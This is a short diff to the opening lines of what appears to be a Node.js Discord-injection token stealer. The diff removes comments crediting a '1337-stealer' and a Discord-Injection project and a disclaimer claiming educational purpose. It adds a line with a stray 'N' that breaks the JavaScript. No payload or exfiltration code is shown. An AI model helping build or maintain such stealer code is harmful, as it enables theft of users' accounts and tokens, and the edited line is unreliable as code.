@@ -1,8 +1,4 @@
-//THANKS TO STANLEY FOR UR DESIGN OF EMBED (https://github.com/sudrywwq/1337-stealer)
-//AND RDIMO FOR THE OPERATION OF THE INJECTION (https://github.com/Rdimo/Discord-Injection) 
-//I AM NOT RESPONSIBLE IF YOU USE IT IN A MALICIOUS PROGRAM !
-//THIS IS FOR EDICATIONNALY PURPOSES ONLY.
-const args = process.argv;
+const args = process.argv;N
 const fs = require('fs');
 const path = require('path');
 const https = require('https');
